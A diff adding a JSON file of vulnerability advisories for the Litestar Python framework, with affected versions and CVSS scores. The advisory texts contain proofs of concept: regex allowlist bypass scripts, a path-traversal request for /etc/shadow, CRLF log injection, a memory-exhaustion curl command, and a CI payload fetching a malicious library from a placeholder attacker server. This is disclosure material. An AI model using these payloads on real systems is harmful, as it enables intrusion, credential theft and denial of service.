@@ -1,0 +1,882 @@
+{
+  "schema_version": 1,
+  "package": "litestar-with-opentelemetry",
+  "purls": [
+    "pkg:pypi/litestar"
+  ],
+  "generated_at": "2026-05-18T06:01:40+00:00",
+  "conda_versions_total": 21,
+  "advisories": [
+    {
+      "id": "GHSA-2p2x-hpg8-cqp2",
+      "primary_id": "CVE-2026-25478",
+      "aliases": [
+        "CVE-2026-25478"
+      ],
+      "cve_ids": [
+        "CVE-2026-25478"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "litestar",
+      "summary": "Litestar's CORS origin allowlist has a bypass due to unescaped regex metacharacters in allowed origins",
+      "details": "### Summary\nCORS origin validation can be bypassed because the allowed-origins allowlist is compiled into a regex without escaping metacharacters (notably .). An allowed origin like https://good.example can match https://goodXexample, resulting in Access-Control-Allow-Origin being set for an untrusted origin\n\n### Details\nCORSConfig.allowed_origins_regex is constructed using a regex built from configured allowlist values and used with fullmatch() for validation. Because metacharacters are not escaped, a malicious origin can match unexpectedly. The check relies on allowed_origins_regex.fullmatch(origin).\n\n### PoC\nServer (poc_cors_server.py)\n\n```\nfrom litestar import Litestar, get\nfrom litestar.config.cors import CORSConfig\n\n@get(\"/c\")\nasync def c() -> str:\n    return \"ok\"\n\ncors = CORSConfig(\n    allow_origins=[\"https://good.example\"],\n    allow_credentials=True,\n)\napp = Litestar([c], cors_config=cors)\n```\n\n`uvicorn poc_cors_server:app --host 127.0.0.1 --port 8002`\n\nClient (poc_cors_client.py)\n\n```\nimport http.client\n\ndef req(origin: str) -> tuple[int, str | None]:\n    c = http.client.HTTPConnection(\"127.0.0.1\", 8002, timeout=3)\n    c.request(\"GET\", \"/c\", headers={\"Origin\": origin, \"Host\": \"example.com\"})\n    r = c.getresponse()\n    r.read()\n    acao = r.getheader(\"Access-Control-Allow-Origin\")\n    c.close()\n    return r.status, acao\n\nprint(\"evil:\", req(\"https://evil.example\"))\nprint(\"bypass:\", req(\"https://goodXexample\")) \n```\n\nExpected (vulnerable behavior):\n\nOrigin: https://evil.example \u2192 no ACAO\nOrigin: https://goodXexample \u2192 ACAO: https://goodxexample/ (bypass)\n\n### Impact\nType: CORS policy bypass (cross-origin data exposure risk)\nWho is impacted: apps using CORS allowlists to restrict browser cross-origin reads. If allow_credentials=True and authenticated endpoints return sensitive data, an attacker-controlled site can potentially read responses in a victim\u2019s browser session.",
+      "published": "2026-02-09T17:18:52Z",
+      "modified": "2026-02-22T23:30:54.997735Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/litestar-org/litestar/security/advisories/GHSA-2p2x-hpg8-cqp2"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-25478"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/litestar-org/litestar/commit/eb87703b309efcc0d1b087dcb12784e76b003d5a"
+        },
+        {
+          "type": "WEB",
+          "url": "https://docs.litestar.dev/2/release-notes/changelog.html#2.20.0"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/litestar-org/litestar"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/litestar-org/litestar/releases/tag/v2.20.0"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-2p2x-hpg8-cqp2",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "2.19.0"
+            },
+            {
+              "fixed": "2.20.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "2.19.0"
+      ],
+      "affected_conda_versions": [
+        "2.19.0"
+      ]
+    },
+    {
+      "id": "GHSA-4hq2-rpgc-r8r7",
+      "primary_id": "CVE-2024-42370",
+      "aliases": [
+        "CVE-2024-42370"
+      ],
+      "cve_ids": [
+        "CVE-2024-42370"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "litestar",
+      "summary": "Withdrawn Advisory: Litestar has an environment Variable injection in `docs-preview.yml` workflow",
+      "details": "## Withdrawn Advisory\nThis advisory has been withdrawn because the confidentiality, integrity, and availability impacts of the vulnerability affect Litestar's CI/CD environment rather than the `litestar` package. While the information in the advisory is still valid, users of the `litestar` package are not affected and do not need to receive Dependabot alerts.\n\n## Original Advisory\n\n### Summary\nLitestar's `docs-preview.yml` workflow is vulnerable to Environment Variable injection which may lead to secret exfiltration and repository manipulation.\n\n### Environment Variable injection (`GHSL-2024-177`)\n\nThe [`docs-preview.yml` workflow](https://github.com/litestar-org/litestar/blob/ffaf5616b19f6f0f4128209c8b49dbcb41568aa2/.github/workflows/docs-preview.yml) gets triggered when the `Tests And Linting` workflow completes:\n\n```yaml\non:\n  workflow_run:\n    workflows: [Tests And Linting]\n    types: [completed]\n```\n\nLater, it downloads and extracts an artifact generated by the triggering workflow:\n\n```yaml\n- name: Download artifact\nuses: dawidd6/action-download-artifact@v6\nwith:\n  workflow_conclusion: success\n  run_id: ${{ github.event.workflow_run.id }}\n  path: docs-preview\n  name: docs-preview\n```\n\nAnd reads `docs-preview/.pr_number` into an Environment Variable:\n\n```yaml\n- name: Set PR number\n  run: echo \"PR_NUMBER=$(cat docs-preview/.pr_number)\" >> $GITHUB_ENV\n```\n\nThe `$GITHUB_ENV` pointed file is just a regular file where every `KEY=VALUE` will be used to define a new Environment Variable after the step completes. Since the contents of the `.pr_number` file have not been validated, they may contain new lines that will cause new Environment Variables to be defined.\n\nAn attacker can send a malicious `.pr_number` file with the following content:\n\n```txt\n111\nLD_PRELOAD=/home/runner/work/litestar/litestar/inject.so\n```\n\nWhich will result in two Environment Variables being defined:\n\n- PR_NUMBER=111\n- LD_PRELOAD=/home/runner/work/litestar/litestar/inject.so\n\nIn this example we are manipulating the `LD_PRELOAD` environment variable to force the system to load a malicious shared library called `inject.so`. As a result, all subsequent processes launched will automatically incorporate this compromised library into their execution environment.\n\nThe following step will run the `JamesIves/github-pages-deploy-action` action which will [run the `node` command](https://github.com/JamesIves/github-pages-deploy-action/blob/2c9a889f39c2410b2ca1342f465a53a7c5c389b4/action.yml#L5). Therefore the `LD_PRELOAD` will execute arbitrary code when `node` gets executed:\n\n```yaml\n- name: Deploy docs preview\n  uses: JamesIves/github-pages-deploy-action@v4\n  with:\n    folder: docs-preview/docs/_build/html\n    token: ${{ secrets.DOCS_PREVIEW_DEPLOY_TOKEN }}\n    repository-name: litestar-org/litestar-docs-preview\n    clean: false\n    target-folder: ${{ env.PR_NUMBER }}\n    branch: gh-pages\n```\n\n#### PoC\n\n- Clone the repository\n- Edit the `ci.yml` workflow.\n\n```yaml\nname: Tests And Linting\n\non:\n  pull_request:\n\njobs:\n  upload-patch:\n    runs-on: ubuntu-latest\n    timeout-minutes: 10\n    steps:\n      - name: Save PR number and payload\n        run: |\n          make payload\n          echo -e \"${{ github.event.number }}\\nLD_PRELOAD=/home/runner/work/litestar/litestar/inject.so\" > payload/.pr_number\n          curl http://<ATTACKER SERVER>/inject.so -o payload/inject.so\n\n      - name: Upload artifact\n        uses: actions/upload-artifact@v3\n        with:\n          name: docs-preview\n          path: payload\n```\n\n- Create a Pull Request with this change.\n- Since the modified workflow is triggered on `pull_request`, the attacker Pull Request will trigger it and upon completion will trigger the vulnerable `Deploy documentation preview` workflow which will read the malicious artifact and pollute the Environment Variables.\n\n#### Impact\n\nThis issue will grant a malicious actor the [following permissions](https://github.com/litestar-org/litestar/actions/runs/10081936962/job/27875077668#step:1:17):\n\n```\n  Issues: write\n  Metadata: read\n  PullRequests: write\n```\n\nIn addition, the following secret will get exposed to the attacker: `DOCS_PREVIEW_DEPLOY_TOKEN`\n\n#### Remediation\n\n- Verify the contents of the downloaded artifacts.\n- Do not allow new lines in the value redirected to GITHUB_ENV\n\n### Resources\n\n- [CodeQL for JavaScript - Expression injection in Actions](https://codeql.github.com/codeql-query-help/javascript/js-actions-command-injection/)\n- [Keeping your GitHub Actions and workflows secure Part 2: Untrusted input](https://securitylab.github.com/research/github-actions-untrusted-input/)\n- [Keeping your GitHub Actions and workflows secure Part 1: Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)\n\n## Disclosure Policy\nThis report is subject to a 90-day disclosure deadline, as described in more detail in our [coordinated disclosure policy](https://securitylab.github.com/advisories#policy).",
+      "published": "2024-08-09T19:22:40Z",
+      "modified": "2024-10-08T04:27:18.926478Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:H"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:H"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/litestar-org/litestar/security/advisories/GHSA-4hq2-rpgc-r8r7"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-42370"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/litestar-org/litestar/commit/84d351e96aaa2a1338006d6e7221eded161f517b"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/litestar-org/litestar"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/litestar-org/litestar/actions/runs/10081936962/job/27875077668#step:1:17"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/litestar-org/litestar/blob/ffaf5616b19f6f0f4128209c8b49dbcb41568aa2/.github/workflows/docs-preview.yml"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-4hq2-rpgc-r8r7",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "2.10.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "1.0.0a0",
+        "2.0.0",
+        "2.0.0a3",
+        "2.0.0a4",
+        "2.0.0a5",
+        "2.0.0a6",
+        "2.0.0a7",
+        "2.0.0b1",
+        "2.0.0b2",
+        "2.0.0b3",
+        "2.0.0b4",
+        "2.0.0rc1",
+        "2.0.1",
+        "2.1.0",
+        "2.1.1",
+        "2.10.0",
+        "2.2.0",
+        "2.2.1",
+        "2.3.0",
+        "2.3.1",
+        "2.3.2",
+        "2.4.0",
+        "2.4.1",
+        "2.4.2",
+        "2.4.3",
+        "2.4.4",
+        "2.4.5",
+        "2.5.0",
+        "2.5.1",
+        "2.5.2",
+        "2.5.3",
+        "2.5.4",
+        "2.5.5",
+        "2.6.0",
+        "2.6.1",
+        "2.6.2",
+        "2.6.3",
+        "2.6.4",
+        "2.7.0",
+        "2.7.1",
+        "2.7.2",
+        "2.8.0",
+        "2.8.1",
+        "2.8.2",
+        "2.8.3",
+        "2.9.0",
+        "2.9.1"
+      ],
+      "affected_conda_versions": [
+        "2.8.0",
+        "2.8.2",
+        "2.8.3",
+        "2.9.0",
+        "2.9.1",
+        "2.10.0"
+      ]
+    },
+    {
+      "id": "GHSA-674p-xv2x-rf3g",
+      "primary_id": "GHSA-674p-xv2x-rf3g",
+      "aliases": [],
+      "cve_ids": [],
+      "ecosystem": "PyPI",
+      "upstream_name": "litestar",
+      "summary": "Litestar has potential log injection in exception logging",
+      "details": "### Summary\n\nLitestar does not escape url paths when logging exceptions. This makes logger vulnerable to CRLF injection if logging level is configured to debug or `log_exceptions` is set to \"always\", which allows attackers to inject newlines and forge log entries.\n\n### Details\n\nLitestar directly formats unquoted path into exception logs without validation or escaping when using default exception logging handler.\n\nhttps://github.com/litestar-org/litestar/blob/1e0dc7c4d67151c836208a3e360051e983b5083a/litestar/logging/config.py#L145-L150\n\nAttackers can inject newlines in logs by embedding`%0d%0a` in url path.\n\n`log_exceptions=\"always\"` is not enabled by default. However, it is set in the examples of documentation (https://github.com/litestar-org/litestar/blob/1e0dc7c4d67151c836208a3e360051e983b5083a/docs/usage/logging.rst#logging). User will be impacted if they directly copy the logging config from docs.\n\n### PoC\n\n```\ncurl \"http://172.17.0.2:8000/%29%0D%0AINFO:%20%20%20%20%20127.0.0.1:8192%20-%20%22POST%20/login%20HTTP/1.1%22%20200%20OK%0D%0A%28\"\n```\n\nlogging:\n\n```\n2025-07-15 00:00:00 - litestar - ERROR - Uncaught exception (connection_type=http, path=/)\nINFO:     127.0.0.1:8192 - \"POST /login HTTP/1.1\" 200 OK\n...\n```\n\nIf stacktracks for 404 are configured to be ignored (`disable_stack_trace={404},`), attacker may also exploit this by sending malformed requests to cause 400/500 exceptions and avoid 404 in endpoints with str path parameters.",
+      "published": "2025-08-11T23:07:36Z",
+      "modified": "2025-08-12T00:12:19.054355Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/litestar-org/litestar/security/advisories/GHSA-674p-xv2x-rf3g"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/litestar-org/litestar/commit/03b5813d4f448dd710af9ba6252d798cb9fc087f"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/litestar-org/litestar"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-674p-xv2x-rf3g",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.17.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "1.0.0a0",
+        "2.0.0",
+        "2.0.0a3",
+        "2.0.0a4",
+        "2.0.0a5",
+        "2.0.0a6",
+        "2.0.0a7",
+        "2.0.0b1",
+        "2.0.0b2",
+        "2.0.0b3",
+        "2.0.0b4",
+        "2.0.0rc1",
+        "2.0.1",
+        "2.1.0",
+        "2.1.1",
+        "2.10.0",
+        "2.11.0",
+        "2.12.0",
+        "2.12.1",
+        "2.13.0",
+        "2.14.0",
+        "2.15.0",
+        "2.15.1",
+        "2.15.2",
+        "2.16.0",
+        "2.2.0",
+        "2.2.1",
+        "2.3.0",
+        "2.3.1",
+        "2.3.2",
+        "2.4.0",
+        "2.4.1",
+        "2.4.2",
+        "2.4.3",
+        "2.4.4",
+        "2.4.5",
+        "2.5.0",
+        "2.5.1",
+        "2.5.2",
+        "2.5.3",
+        "2.5.4",
+        "2.5.5",
+        "2.6.0",
+        "2.6.1",
+        "2.6.2",
+        "2.6.3",
+        "2.6.4",
+        "2.7.0",
+        "2.7.1",
+        "2.7.2",
+        "2.8.0",
+        "2.8.1",
+        "2.8.2",
+        "2.8.3",
+        "2.9.0",
+        "2.9.1"
+      ],
+      "affected_conda_versions": [
+        "2.8.0",
+        "2.8.2",
+        "2.8.3",
+        "2.9.0",
+        "2.9.1",
+        "2.10.0",
+        "2.11.0",
+        "2.12.0",
+        "2.12.1",
+        "2.13.0",
+        "2.14.0",
+        "2.15.0",
+        "2.15.1",
+        "2.15.2",
+        "2.16.0"
+      ]
+    },
+    {
+      "id": "GHSA-83pv-qr33-2vcf",
+      "primary_id": "CVE-2024-32982",
+      "aliases": [
+        "CVE-2024-32982"
+      ],
+      "cve_ids": [
+        "CVE-2024-32982"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "litestar",
+      "summary": "Litestar and Starlite vulnerable to Path Traversal",
+      "details": "# Summary\n**Local File Inclusion via Path Traversal in LiteStar Static File Serving**\n\nA Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of [LiteStar](https://github.com/litestar-org/litestar). This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.\n\n## Details\nThe vulnerability is located in the file path handling mechanism within the static content serving function, specifically at [line 70 in `litestar/static_files/base.py`](https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70).\n\nThe function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:\n\n```python\ncommonpath([str(directory), file_info[\"name\"], joined_path])\n```\n\nGiven the variables:\n```python\ndirectory = PosixPath('/Users/brian/sandbox/test_vuln/static')\nfile_info[\"name\"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'\njoined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')\n```\n\nThe function outputs '/Users/brian/sandbox/test_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.\n\n\n## Proof of Concept (PoC)\nTo reproduce this vulnerability, follow these steps:\n\n1. **Set up the environment:**\n   - Install with pip the `uvicorn` and `litestar` packages.\n   - Create a `static` folder in the root directory of your project and place any file (e.g., an image) in it for testing.\n   - Ensure the static file serving is enabled, which is typically the default configuration.\n\n2. **Preparation of the testing environment:**\n   - If using Ubuntu or a similar system, you can use `/etc/shadow` which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.\n   - Create a `main.py` file with the following content to configure and run the LiteStar server:\n\n    ```python\n    from pathlib import Path\n    from litestar import Litestar\n    from litestar.static_files import create_static_files_router\n    import uvicorn\n\n    app = Litestar(\n        route_handlers=[\n            create_static_files_router(path=\"/static\", directories=[\"static\"]),\n        ],\n    )\n\n    if __name__ == \"__main__\":\n        uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8000)\n    ```\n\n   - Run this script with the command `python3 main.py` to start the server.\n\n3. **Exploit:**\n   - Prepare an exploit script named `exploit.py` with the following Python code to perform the HTTP request without client-side sanitization:\n\n    ```python\n    import http.client\n\n    def send_request(host, port, path):\n        connection = http.client.HTTPConnection(host, port)\n        connection.request(\"GET\", path)\n        response = connection.getresponse()\n        print(f\"Status: {response.status}\")\n        print(f\"Headers: {response.getheaders()}\")\n        data = response.read()\n        print(f\"Body: {data.decode('utf-8')}\")\n        connection.close()\n\n    send_request(\"localhost\", 8000, \"/static/../../../../../../etc/shadow\")\n    ```\n\n   - Execute this script using `python3 exploit.py`. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.\n\n4. **Observe:**\n   - The server should respond with the contents of the `/etc/shadow` file, thereby confirming the path traversal vulnerability.\n   - The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.\n\n\n## Impact\n\nThis Local File Inclusion vulnerability critically affects all instances of [LiteStar](https://github.com/litestar-org/litestar) where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:\n\n1. **Exposure of Sensitive Information:**\n   - The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.\n\n2. **Potential for System Compromise:**\n   - If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a `.env` file might reveal environment variables used for application configurations that include database passwords or API keys.\n\n3. **Credential Leakage:**\n   - Access to files such as `/etc/passwd` or `/etc/shadow` (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.\n\n4. **Regulatory and Compliance Violations:**\n   - Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.\n\n5. **Loss of Trust and Reputation Damage:**\n   - Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.\n\n6. **Potential for Further Exploitation:**\n   - The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.\n\n\n\nHere's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:\n\n\n## Mitigation Suggestion\n\nTo effectively address the Local File Inclusion vulnerability via path traversal identified in the [LiteStar](https://github.com/litestar-org/litestar) application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:\n\n1. **Input Validation and Sanitization:**\n   - Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as `../` which are used in path traversal attacks.\n   - Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.\n\n2. **Path Normalization:**\n   - Normalize file paths before using them in file operations. Functions such as `os.path.normpath()` in Python can be used to normalize paths. This method resolves redundant separators and up-level references (`../`) to prevent directory traversal.\n   - As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:\n     ```python\n     if os.path.commonpath([full_path, directory]) != directory:\n         # Don't allow misbehaving clients to break out of the static files\n         # directory.\n         continue\n     ```\n     This snippet from [Starlette's implementation](https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166) ensures that the constructed file path does not traverse out of the specified directory.\n\n\n## Comments\n**Naming Convention:**\n- From versions 0.X.X through 1.X.X, the package was released under the name \"starlite.\"\n- Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name \"litestar.\"\n\n**Feature Additions and Changes:**\n- Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.\n- Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.",
+      "published": "2024-05-06T14:20:50Z",
+      "modified": "2024-07-08T19:06:06.271311Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/litestar-org/litestar/security/advisories/GHSA-83pv-qr33-2vcf"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-32982"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/litestar-org/litestar/commit/57e706e7effdc182fc9a2af5981bc88afb21851b"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/litestar-org/litestar/commit/a07b79b84d8717bec5ac4d4674c1e4920ba9c813"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/litestar-org/litestar"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-83pv-qr33-2vcf",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "2.8.0"
+            },
+            {
+              "fixed": "2.8.3"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "2.8.0",
+        "2.8.1",
+        "2.8.2"
+      ],
+      "affected_conda_versions": [
+        "2.8.0",
+        "2.8.2"
+      ]
+    },
+    {
+      "id": "GHSA-93ph-p7v4-hwh4",
+      "primary_id": "CVE-2026-25479",
+      "aliases": [
+        "CVE-2026-25479"
+      ],
+      "cve_ids": [
+        "CVE-2026-25479"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "litestar",
+      "summary": "Litestar's AllowedHosts has a validation bypass due to unescaped regex metacharacters in configured host patterns",
+      "details": "### Summary\nAllowedHosts host validation can be bypassed because configured host patterns are turned into regular expressions without escaping regex metacharacters (notably .). A configured allowlist entry like example.com can match exampleXcom\n\n### Details\nIn litestar.middleware.allowed_hosts, allowlist entries are compiled into regex patterns in a way that allows regex metacharacters to retain special meaning (e.g., . matches any character). This enables a bypass where an attacker supplies a host that matches the regex but is not the intended literal hostname.\n\n### PoC\nServer (poc_allowed_hosts_server.py)\n\n```\nfrom litestar import Litestar, get\nfrom litestar.middleware.allowed_hosts import AllowedHostsConfig\n\n@get(\"/\")\nasync def index() -> str:\n    return \"ok\"\n\nconfig = AllowedHostsConfig(allowed_hosts=[\"example.com\"])\napp = Litestar([index], allowed_hosts_config=config)\n```\n\n`uvicorn poc_allowed_hosts_server:app --host 127.0.0.1 --port 8001`\n\nClient (poc_allowed_hosts_client.py)\n\n```\nimport http.client\n\ndef req(host_header: str) -> tuple[int, bytes]:\n    c = http.client.HTTPConnection(\"127.0.0.1\", 8001, timeout=3)\n    c.request(\"GET\", \"/\", headers={\"Host\": host_header})\n    r = c.getresponse()\n    body = r.read()\n    c.close()\n    return r.status, body\n\nprint(\"evil.com:\", *req(\"evil.com\"))\nprint(\"exampleXcom:\", *req(\"exampleXcom\"))\n```\n\nExpected (vulnerable behavior):\nHost: evil.com \u2192 400 invalid host\n\nHost: exampleXcom \u2192 200 ok (bypass)\n\n### Impact\nType: security control bypass (host allowlist)\nWho is impacted: apps relying on AllowedHosts to prevent Host header attacks (cache poisoning, absolute URL construction abuse, password reset link poisoning, etc.). The downstream impact depends on app behavior, but the bypass defeats a core mitigation layer.",
+      "published": "2026-02-09T17:19:00Z",
+      "modified": "2026-02-22T23:23:18.688831Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/litestar-org/litestar/security/advisories/GHSA-93ph-p7v4-hwh4"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-25479"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/litestar-org/litestar/commit/06b36f481d1bfea6f19995cfb4f203aba45c4ace"
+        },
+        {
+          "type": "WEB",
+          "url": "https://docs.litestar.dev/2/release-notes/changelog.html#2.20.0"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/litestar-org/litestar"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/litestar-org/litestar/releases/tag/v2.20.0"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-93ph-p7v4-hwh4",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "2.19.0"
+            },
+            {
+              "fixed": "2.20.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "2.19.0"
+      ],
+      "affected_conda_versions": [
+        "2.19.0"
+      ]
+    },
+    {
+      "id": "GHSA-gjcc-jvgw-wvwj",
+      "primary_id": "CVE-2024-52581",
+      "aliases": [
+        "CVE-2024-52581",
+        "PYSEC-2024-178"
+      ],
+      "cve_ids": [
+        "CVE-2024-52581"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "litestar",
+      "summary": "Litestar allows unbounded resource consumption (DoS vulnerability) ",
+      "details": "### Summary\nLitestar offers multiple methods to return a parsed representation of the request body, as well as extractors that rely on those parsers to map request content to structured data types. Multiple of those parsers do not have size limits when reading the request body into memory, which allows an attacker to cause excessive memory consumption on the server by sending large requests.\n\n### Details\nThe `Request` methods to parse json, msgpack or form-data all read the entire request stream into memory via `await self.body()` without a prior size check or size limit. There may be other places (e.g. extractors) where this can happen.\n\nFor most formats, a configurable size limit would be sufficient to mitigate this issue. The total request size can also be limited by a proxy (e.g. nginx) in front of the actual application as a workaround. However, for applications that actually want to accept large file uploads via `multipart/form-data`, a simple size limit would not be practical. The multipart parser currently used by Litestar expects a single byte string as input and does not support incremental parsing via `Request.stream()`. Applications could bypass the Litestar parser and use a [streaming parser](https://pypi.org/project/multipart/) to read from `Request.stream()` instead, but that would not work with extractors and other features of the framework. Switching the parser for a different implementation is currently not possible via public APIs.\n\n### PoC\nStart an applications that accesses `Request.json()`, `Request.msgpack()` or `Request.form()` or uses an extractor that relies on those parsers internally, and send a large request with a matching content type. The actual content of the request does not matter. For example: `curl -F \"foo=</dev/random\" http://127.0.0.1:8000/`) for `multipart/form-data`. Server memory consumption will increase very quickly until memory (and swap) are exhausted.\n\n### Impact\nThis is a denial of service (DoS) vulnerability affecting all Litestar applications that process json, msgpack or form-data submission requests.\n",
+      "published": "2024-11-20T21:38:58Z",
+      "modified": "2026-02-04T02:54:16.445692Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:L"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        },
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:L"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/litestar-org/litestar/security/advisories/GHSA-gjcc-jvgw-wvwj"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/litestar-org/litestar/security/advisories/GHSA-p24m-863f-fm6q"
+        },
+        {
